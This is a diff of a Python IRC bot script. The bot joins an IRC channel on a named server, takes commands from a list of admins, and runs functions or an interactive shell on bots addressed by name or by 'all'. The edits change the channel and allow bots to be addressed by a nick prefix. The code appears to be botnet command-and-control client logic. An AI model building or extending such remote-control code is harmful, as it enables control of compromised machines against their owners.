@@ -300,7 +300,7 @@ INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is 
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 port = 6667
-channel = "#lobby"
+channel = "#test"
 nick = generateNick(operatingSystem)
 
 print "The botnick is: '%s'" % nick
@@ -384,7 +384,7 @@ def parseCommand(command):
 					return
 				elif "??-" == command[:3]:
 					users = command[3:].split(" ")
-					if nick in users or "all" in users:
+					if nick in users or "all" in users or nick[:3] in users:
 						INTERACT[1] = 0
 
 					return
@@ -405,7 +405,7 @@ def parseCommand(command):
 				for user in users:
 					print "user is '%s'" % user
 
-				if not nick in users and not "all" in users:
+				if not nick in users and not "all" in users and not nick[:3] in users:
 					INTERACT[1] = 0
 					return
 			elif "?!" == command[:2]: #if they want to single out one or more bots to run a function
@@ -416,7 +416,7 @@ def parseCommand(command):
 					return
 
 				users = lines[0].split(" ")
-				if nick in users or "all" in users:
+				if nick in users or "all" in users or nick[:3] in users:
 					lines[1] = lines[1].strip()
 					runFunction(lines[1])
 			else:
